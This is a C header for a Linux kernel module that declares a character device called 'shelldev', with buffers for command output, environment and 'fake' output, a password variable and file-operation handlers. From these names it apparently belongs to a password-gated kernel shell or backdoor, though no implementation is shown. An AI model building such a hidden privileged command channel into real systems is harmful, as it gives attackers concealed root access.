#ifndef DRIVERS_HEADER
#define DRIVERS_HEADER

#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>

#include "debug.h"

#define SHELL_DEV_NAME "shelldev"

struct shell_driver_data {
    struct cdev cdev;
    char* output;
    u32 output_len;
    char** env;
    u32 env_count;
    char* fake;
    u32 fake_len;
    struct mutex mutex;

};

typedef enum {FAKE, OUTPUT, ENV} shell_mode_t; 

extern struct file_operations shell_fops;

extern struct shell_driver_data driver_data;

extern char* password;

bool init_shell_device(void);

void exit_shell_device(void);

int shell_open(struct inode *inode, struct file *f);
int shell_close(struct inode *inode, struct file *f);
ssize_t shell_read(struct file *f, char __user *buf, size_t len, loff_t *off);
ssize_t shell_write(struct file *f, const char __user *user_buf, size_t len, loff_t *off);
int shell_uevent(struct device *dev, struct kobj_uevent_env *env);



#endif